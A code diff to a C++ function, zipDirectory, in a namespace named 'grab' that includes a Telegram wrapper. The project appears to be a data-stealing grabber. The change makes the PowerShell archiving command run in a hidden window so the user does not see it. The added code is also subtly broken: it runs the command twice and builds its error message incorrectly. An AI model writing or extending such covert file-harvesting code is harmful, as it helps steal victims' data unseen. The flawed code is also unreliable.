@@ -1,4 +1,5 @@
 #include "pch.h"
+
 #include "../wrappers/telegram.h"
 #include "../utils.h"
 #include "../debug.h"
@@ -15,6 +16,29 @@ namespace fs = std::filesystem;
 namespace grab {
     int zipDirectory(const std::string& dirPath, const std::string& outputZip) {
         std::string cmd = "powershell -Command \"Compress-Archive -Path '" + dirPath + "\\*' -DestinationPath '" + outputZip + "' -Force\"";
+
+        STARTUPINFOA si;
+        PROCESS_INFORMATION pi;
+
+        ZeroMemory(&si, sizeof(si));
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+
+        ZeroMemory(&pi, sizeof(pi));
+
+        BOOL success = CreateProcessA(NULL, cmd.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+
+        if (!success) {
+            Debug::LogError("CreateProcess failed: " + GetLastError());
+            return 1;
+        }
+
+        WaitForSingleObject(pi.hProcess, INFINITE);
+
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+
         return std::system(cmd.c_str());
     }
 
